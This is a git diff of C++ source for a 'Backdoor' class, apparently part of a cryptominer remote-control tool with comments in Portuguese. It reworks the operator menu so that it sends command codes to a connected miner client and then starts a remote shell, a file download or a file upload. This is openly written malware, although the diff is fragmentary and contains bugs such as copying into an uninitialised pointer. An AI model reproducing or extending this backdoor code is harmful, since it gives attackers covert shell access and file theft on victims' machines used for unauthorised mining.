@@ -3,10 +3,9 @@
 /*
     Socket codes:
         1 - shell
-        2 - upload
-        3 - download
+        2 - download
+        3 - upload
         4 - MinerInfo
-        5 - exit
 */
 
 
@@ -27,13 +26,11 @@ void Backdoor::shell(){
                 std::cout << output << std::endl;
             }   
         }
-
-
     }else{
 
         while(true){
 
-            char *command = this->c->recv_message(this->sock);         
+            char *command = this->c->recv_message(this->sock);    
             char *copy, *part;
             strcpy(copy, command);
             part = strtok(copy, " ");
@@ -81,35 +78,46 @@ void Backdoor::download(const char *path){
 
 
 void Backdoor::menu(){
-    int choice;
-    std::cout << "MINER_ID = " << this->miner_id << " - IP = \n" << this->client_ip << std::endl;
+    if(this->is_server){
+        while(true){
+            int choice;
+            execute_command("cls");
+            std::cout << "MINER_ID = " << this->miner_id << " - IP = \n" << this->client_ip << std::endl;
 
-    std::cout << "Operações : " << std::endl;
+            std::cout << "Operações : " << std::endl;
 
-    std::cout << "1) Shell\n2) Download\n3)Upload\n" << std::endl;
+            std::cout << "1) Shell\n2) Download\n3)Upload\n" << std::endl;
 
-    choice = std::cin.get();
+            choice = std::cin.get();
 
 
-    if(choice == 1){
-        this->shell();
-    
-    }else if(choice == 2){
-        std::string path;
-        std::cout << "Path: ";
-        std::getline(std::cin, path);
-         // Get path
+            if(choice == 1){
+                this->c->send_message(this->sock, "1");
+                this->shell();
+            
+            }else if(choice == 2){
+                std::string path;
+                std::cout << "Path: ";
+                std::getline(std::cin, path);
+                // Get path
+                this->c->send_message(this->sock, "2");
+                this->download(path.c_str());
 
-        this->download(path.c_str());
-
-    }else if(choice == 3){
-        std::string path;
-        std::cout << "Path: ";
-        std::getline(std::cin, path);
-        this->upload(path.c_str());
-    
+            }else if(choice == 3){
+                std::string path;
+                std::cout << "Path: ";
+                std::getline(std::cin, path);
+                this->c->send_message(this->sock, "3");
+                this->upload(path.c_str());
+            }else if(choice == 4){
+                return;
+            
+            }else{
+                Error::log_error("Comando inválido");
+            }
+        }
     }else{
-        std::cout << "Comando inválido" << std::endl;
+        
     }
 }
 
